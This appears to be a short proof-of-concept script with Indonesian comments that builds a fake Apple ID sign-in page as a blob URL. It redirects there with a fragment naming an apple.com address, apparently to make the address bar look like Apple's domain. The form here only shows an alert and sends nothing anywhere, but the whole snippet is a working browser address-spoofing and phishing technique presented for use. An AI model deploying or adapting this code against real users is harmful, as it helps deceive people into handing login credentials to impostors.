<script>
// Simple version - seperti original Renwa
payload = 'x#https://www.account.apple.com';

// Create blob dengan fake login page
fakePage = `
<html>
<body style="font-family: Arial; padding: 40px; text-align: center;">
    <h1>üçé Apple ID</h1>
    <form onsubmit="alert('Login attempted')">
        <input type="email" placeholder="Apple ID"><br><br>
        <input type="password" placeholder="Password"><br><br>
        <button>Sign In</button>
    </form>
</body>
</html>
`;

blob = new Blob([fakePage], { type: 'text/html' });
url = URL.createObjectURL(blob);

// Redirect ke blob URL dengan payload
location = url + '#?' + payload;
</script>
